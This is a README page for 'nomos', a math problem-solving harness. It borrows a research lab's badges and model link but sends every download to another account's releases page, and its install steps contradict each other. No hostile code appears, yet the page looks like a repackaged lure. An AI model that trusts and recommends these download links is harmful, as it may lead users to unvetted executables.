---
layout: "default"
title: "🧠 nomos - Solve Mathematical Problems Easily"
description: "🧮 Solve mathematical problems and write proofs in natural language using the Nomos reasoning harness for streamlined problem-solving."
---
# 🧠 nomos - Solve Mathematical Problems Easily

<p align="center">
  <a href="https://github.com/gur3245singh/nomos/releases">
    <img src="https://img.shields.io/badge/Download-Now-4CAF50?logoColor=white" alt="Download Now">
  </a>
</p>

<p align="center">
  <a href="https://x.com/NousResearch"><img src="https://img.shields.io/badge/X-NousResearch-000000?logo=x&logoColor=white" alt="X (formerly Twitter)"></a>&nbsp;
  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/License-MIT-yellow?logoColor=white" alt="MIT License"></a>&nbsp;
  <a href="https://huggingface.co/NousResearch/nomos-1"><img src="https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Model-FFD21E" alt="Hugging Face"></a>
</p>
<p align="center">
  <img height="400" alt="image" src="https://github.com/user-attachments/assets/3f665bb9-f45b-4653-b6e9-a670b1f4c705" />
</p>

A reasoning harness for mathematical problem-solving and proof-writing in natural language.

## 🚀 Getting Started

This guide will help you download and run the nomos application. Follow the steps below to get started.

## 📥 Download & Install

To download the application, visit the [Releases page](https://github.com/gur3245singh/nomos/releases). You will find all the versions of the software there.

### Follow These Steps:

1. Click on the **Releases page** link above.
2. Look for the latest version.
3. Download the file appropriate for your operating system.

## 🛠️ Requirements

Before running nomos, ensure you have the following requirements:

- A computer running Windows, macOS, or Linux.
- Python 3.6 or higher installed on your system.
- A stable internet connection for downloading.

If you do not have Python installed, you can download it from the [official Python website](https://www.python.org/downloads/).

## ⚙️ Installation

Once you have downloaded the software, follow these steps to install it:

1. Open your command line interface (Terminal for macOS/Linux and Command Prompt for Windows).
2. Navigate to the directory where you downloaded the `nomos` files.
3. Install the required packages by running:

   ```bash
   pip install -r requirements.txt
   ```

This command will install all necessary libraries to run the application.

## 📈 Using nomos

After installation, you can start using nomos to solve mathematical problems. 

### How to Run the Application

1. Open your command line interface again.
2. Navigate to the directory containing the `solve_agent.py` file.
3. Use the command below to run the application:

   ```bash
   python solve_agent.py <problems_dir> [options]
   ```

### Required Arguments

- `problems_dir`: This is the directory where your `.md` problem files are located. Make sure you specify the correct path.

### Options

You can customize your run with several options:

| Flag   | Default | Description                                          |
|--------|---------|------------------------------------------------------|
| `-h`   |         | Help message to display available commands.         |
| `-v`   | false   | Verbose mode to log detailed output.                |

## 📁 How to Prepare Problem Files

To use nomos, prepare your mathematical problems in Markdown files. Each file should end with the `.md` extension. Place these files in the `problems_dir` you specified in the command.

### Example Structure

```
problems/
├── problem1.md
├── problem2.md
└── problem3.md
```

## 🔍 Support and Feedback

If you encounter issues or have questions, please feel free to reach out through our [GitHub Issues](https://github.com/gur3245singh/nomos/issues) page. Your feedback is valuable and helps us improve the software.

## 🔗 Links

- [GitHub Repository](https://github.com/gur3245singh/nomos)
- [Release Page](https://github.com/gur3245singh/nomos/releases)
- [Documentation](https://github.com/gur3245singh/nomos/wiki) 

Now you are ready to solve mathematical problems effortlessly using nomos! Enjoy your experience.